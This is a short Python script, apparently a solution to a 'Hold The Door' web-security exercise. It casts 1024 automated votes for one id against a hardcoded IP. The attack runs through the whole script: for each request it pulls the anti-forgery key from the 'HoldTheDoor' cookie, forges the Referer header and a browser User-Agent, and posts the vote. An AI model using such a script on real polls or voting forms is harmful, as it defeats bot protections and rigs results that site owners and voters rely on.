#!/usr/bin/python3
import requests

x = "http://158.69.76.135/level2.php/"
header = {
  "Referer": "http://158.69.76.135/level2.php",
  "User-Agent": "Mozilla/5.0 (Widows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
}

for i in range(1024):
    ho = requests.get(x)
    cookies = ho.cookies
    dictionary = cookies.get_dict()
    key = dictionary.get('HoldTheDoor')
    payload = {'id': '2', 'key': key, 'holdthedoor': 'Enviar'}
    s = requests.Session()
    s.headers = header
    res = s.post(x, data=payload, cookies=cookies)
    print("Vote n*{:d} Code:{} Key:{}".format(i, res, key))
    mes=res.cookies.get_dict()
    print("HoldTheDoor" in mes)

    print(mes)
